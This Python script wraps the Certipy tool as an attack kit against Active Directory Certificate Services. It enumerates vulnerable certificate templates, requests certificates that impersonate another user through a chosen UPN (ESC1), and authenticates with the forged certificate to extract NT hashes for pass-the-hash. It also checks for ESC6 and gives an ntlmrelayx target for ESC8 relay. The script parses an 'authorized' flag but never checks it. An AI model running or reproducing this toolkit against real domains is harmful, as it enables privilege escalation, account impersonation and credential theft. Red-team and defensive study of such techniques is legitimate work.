#!/usr/bin/env python3
"""
Certipy - Active Directory Certificate Services (AD CS) Attacks
Production-ready AD CS enumeration and exploitation
ESC1-ESC8 attack techniques for certificate-based privilege escalation
"""

import subprocess
import json
import logging
import argparse
import os
import sys
from pathlib import Path
from typing import Dict, List, Optional
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class CertipyADCS:
    """
    AD CS enumeration and exploitation using Certipy
    Supports ESC1-ESC8 attack techniques
    """
    
    def __init__(self):
        self.results = []
        
    def check_installation(self) -> bool:
        """Check if Certipy is installed"""
        try:
            result = subprocess.run(['certipy', '--help'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                logger.info("Certipy is installed")
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        logger.error("Certipy not installed. Install with: pip install certipy-ad")
        return False
    
    def find_vulnerable_templates(self, target: str, username: str, 
                                  password: str, domain: str,
                                  dc_ip: Optional[str] = None) -> Dict:
        """
        Find vulnerable certificate templates (ESC1-ESC8)
        
        Args:
            target: Target domain controller
            username: Domain username
            password: Password or NTLM hash
            domain: Domain name
            dc_ip: DC IP address (optional)
        """
        if not self.check_installation():
            return {"error": "Certipy not installed"}
        
        cmd = [
            'certipy', 'find',
            '-u', f'{username}@{domain}',
            '-p', password,
            '-target', target,
            '-vulnerable',
            '-json'
        ]
        
        if dc_ip:
            cmd.extend(['-dc-ip', dc_ip])
        
        logger.info(f"Enumerating vulnerable AD CS templates on {target}...")
        logger.info(f"Command: {' '.join([c if c != password else '***' for c in cmd])}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                # Certipy outputs JSON and text
                output_files = list(Path('.').glob('*_Certipy.json'))
                
                if output_files:
                    with open(output_files[0], 'r') as f:
                        data = json.load(f)
                    
                    vulnerable = self._parse_vulnerabilities(data)
                    
                    logger.info(f"Found {len(vulnerable)} vulnerable templates")
                    
                    return {
                        'target': target,
                        'domain': domain,
                        'vulnerable_templates': vulnerable,
                        'output_file': str(output_files[0])
                    }
                else:
                    return {
                        'target': target,
                        'status': 'completed',
                        'output': result.stdout,
                        'vulnerable_templates': []
                    }
            else:
                logger.error(f"Enumeration failed: {result.stderr}")
                return {'error': result.stderr}
                
        except subprocess.TimeoutExpired:
            logger.error("Enumeration timeout")
            return {'error': 'Timeout'}
        except Exception as e:
            logger.error(f"Error: {e}")
            return {'error': str(e)}
    
    def _parse_vulnerabilities(self, data: Dict) -> List[Dict]:
        """Parse vulnerable templates from Certipy JSON"""
        vulnerable = []
        
        for ca_name, ca_data in data.get('Certificate Authorities', {}).items():
            templates = ca_data.get('Templates', {})
            
            for template_name, template_data in templates.items():
                vulns = []
                
                # Check for ESC1
                if (template_data.get('Enrollee Supplies Subject') and
                    template_data.get('Client Authentication')):
                    vulns.append('ESC1')
                
                # Check for ESC2
                if template_data.get('Any Purpose'):
                    vulns.append('ESC2')
                
                # Check for ESC3
                if template_data.get('Enrollment Agent'):
                    vulns.append('ESC3')
                
                if vulns:
                    vulnerable.append({
                        'ca': ca_name,
                        'template': template_name,
                        'vulnerabilities': vulns,
                        'permissions': template_data.get('Permissions', {})
                    })
        
        return vulnerable
    
    def request_certificate(self, target: str, username: str, password: str,
                          domain: str, ca: str, template: str,
                          upn: Optional[str] = None, dns: Optional[str] = None) -> Dict:
        """
        Request certificate from vulnerable template (ESC1 exploitation)
        
        Args:
            target: Target CA
            username: Domain username
            password: Password or hash
            domain: Domain name
            ca: Certificate Authority name
            template: Template name
            upn: User Principal Name to impersonate
            dns: DNS name for computer account
        """
        if not self.check_installation():
            return {"error": "Certipy not installed"}
        
        cmd = [
            'certipy', 'req',
            '-u', f'{username}@{domain}',
            '-p', password,
            '-target', target,
            '-ca', ca,
            '-template', template
        ]
        
        if upn:
            cmd.extend(['-upn', upn])
        
        if dns:
            cmd.extend(['-dns', dns])
        
        logger.info(f"Requesting certificate from template: {template}")
        logger.warning("⚠️  This may trigger security alerts!")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0:
                # Find generated certificate
                cert_files = list(Path('.').glob('*.pfx'))
                
                return {
                    'status': 'success',
                    'template': template,
                    'certificate': str(cert_files[-1]) if cert_files else None,
                    'output': result.stdout
                }
            else:
                return {
                    'status': 'failed',
                    'error': result.stderr
                }
                
        except Exception as e:
            logger.error(f"Request error: {e}")
            return {'error': str(e)}
    
    def authenticate_with_cert(self, target: str, username: str, 
                              domain: str, pfx_file: str,
                              pfx_password: Optional[str] = None) -> Dict:
        """
        Authenticate using stolen/forged certificate
        Retrieves NT hash for Pass-the-Hash attacks
        """
        if not self.check_installation():
            return {"error": "Certipy not installed"}
        
        cmd = [
            'certipy', 'auth',
            '-pfx', pfx_file,
            '-username', username,
            '-domain', domain,
            '-dc-ip', target
        ]
        
        if pfx_password:
            cmd.extend(['-password', pfx_password])
        
        logger.info(f"Authenticating with certificate: {pfx_file}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if 'NT hash' in result.stdout:
                # Extract NT hash
                for line in result.stdout.split('\n'):
                    if 'NT hash' in line:
                        nt_hash = line.split(':')[-1].strip()
                        logger.info(f"Retrieved NT hash: {nt_hash}")
                        
                        return {
                            'status': 'success',
                            'username': username,
                            'nt_hash': nt_hash,
                            'output': result.stdout
                        }
            
            return {
                'status': 'completed',
                'output': result.stdout,
                'stderr': result.stderr
            }
            
        except Exception as e:
            logger.error(f"Auth error: {e}")
            return {'error': str(e)}
    
    def esc4_modify_template(self, target: str, username: str, password: str,
                            domain: str, template: str, 
                            enable_auth: bool = True) -> Dict:
        """
        ESC4: Modify certificate template settings
        """
        logger.warning("ESC4 attacks modify AD objects - use with caution!")
        
        return {
            'status': 'not_implemented',
            'note': 'ESC4 requires manual LDAP modification or BloodHound analysis'
        }
    
    def esc6_editf_flags(self, target: str, username: str, password: str,
                        domain: str, ca: str) -> Dict:
        """
        ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag abuse
        """
        if not self.check_installation():
            return {"error": "Certipy not installed"}
        
        logger.info("Checking for ESC6 vulnerability (EDITF flag)...")
        
        # First, enumerate to check for flag
        cmd = [
            'certipy', 'find',
            '-u', f'{username}@{domain}',
            '-p', password,
            '-target', target,
            '-vulnerable'
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if 'EDITF_ATTRIBUTESUBJECTALTNAME2' in result.stdout:
                logger.warning("ESC6 vulnerability detected!")
                return {
                    'vulnerability': 'ESC6',
                    'ca': ca,
                    'status': 'vulnerable',
                    'note': 'CA allows SAN specification in any template'
                }
            
            return {
                'vulnerability': 'ESC6',
                'status': 'not_vulnerable'
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def esc8_web_enrollment(self, target: str, username: str, password: str,
                           domain: str) -> Dict:
        """
        ESC8: NTLM relay to AD CS HTTP endpoints
        Requires ntlmrelayx integration
        """
        logger.info("ESC8 requires NTLM relay attacks")
        
        return {
            'vulnerability': 'ESC8',
            'note': 'Use ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp',
            'prerequisites': [
                'Impacket ntlmrelayx',
                'HTTP enrollment enabled on CA',
                'NTLM authentication to capture'
            ]
        }
    
    def generate_attack_report(self, results: List[Dict], output_file: str):
        """Generate comprehensive attack report"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'tool': 'Certipy AD CS Scanner',
            'results': results,
            'recommendations': [
                'Disable vulnerable certificate templates',
                'Enable Manager Approval for sensitive templates',
                'Remove unnecessary enrollment rights',
                'Monitor certificate issuance events (4886, 4887)',
                'Implement Extended Protection for Authentication'
            ]
        }
        
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Report saved to: {output_file}")


def main():
    parser = argparse.ArgumentParser(description="Certipy - AD CS Attack Toolkit")
    parser.add_argument('--target', required=True, help='Target DC or CA')
    parser.add_argument('--username', required=True, help='Domain username')
    parser.add_argument('--password', required=True, help='Password or NTLM hash')
    parser.add_argument('--domain', required=True, help='Domain name')
    parser.add_argument('--dc-ip', help='Domain Controller IP')
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Find command
    find_parser = subparsers.add_parser('find', help='Find vulnerable templates')
    
    # Request command
    req_parser = subparsers.add_parser('req', help='Request certificate')
    req_parser.add_argument('--ca', required=True, help='CA name')
    req_parser.add_argument('--template', required=True, help='Template name')
    req_parser.add_argument('--upn', help='UPN to impersonate (ESC1)')
    req_parser.add_argument('--dns', help='DNS name for computer account')
    
    # Auth command
    auth_parser = subparsers.add_parser('auth', help='Authenticate with certificate')
    auth_parser.add_argument('--pfx', required=True, help='PFX certificate file')
    auth_parser.add_argument('--pfx-password', help='PFX password')
    
    # ESC6 check
    esc6_parser = subparsers.add_parser('esc6', help='Check ESC6 vulnerability')
    esc6_parser.add_argument('--ca', required=True, help='CA name')
    parser.add_argument('--authorized', action='store_true',
                       help='Confirm you have authorization to perform this action')
    args = parser.parse_args()
    
    certipy = CertipyADCS()
    
    if not certipy.check_installation():
        print("\n❌ Certipy not installed")
        print("\n📥 Installation:")
        print("   pip install certipy-ad")
        print("\n📚 Resources:")
        print("   https://github.com/ly4k/Certipy")
        print("   https://posts.specterops.io/certified-pre-owned-d95910965cd2")
        return
    
    if args.command == 'find':
        results = certipy.find_vulnerable_templates(
            args.target, args.username, args.password, args.domain, args.dc_ip
        )
        
        print(json.dumps(results, indent=2))
        
        if results.get('vulnerable_templates'):
            print(f"\n⚠️  Found {len(results['vulnerable_templates'])} vulnerable templates:")
            for vuln in results['vulnerable_templates']:
                print(f"\n  Template: {vuln['template']}")
                print(f"  CA: {vuln['ca']}")
                print(f"  Vulnerabilities: {', '.join(vuln['vulnerabilities'])}")
    
    elif args.command == 'req':
        results = certipy.request_certificate(
            args.target, args.username, args.password, args.domain,
            args.ca, args.template, args.upn, args.dns
        )
        
        print(json.dumps(results, indent=2))
    
    elif args.command == 'auth':
        results = certipy.authenticate_with_cert(
            args.target, args.username, args.domain, 
            args.pfx, args.pfx_password
        )
        
        print(json.dumps(results, indent=2))
    
    elif args.command == 'esc6':
        results = certipy.esc6_editf_flags(
            args.target, args.username, args.password, args.domain, args.ca
        )
        
        print(json.dumps(results, indent=2))
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
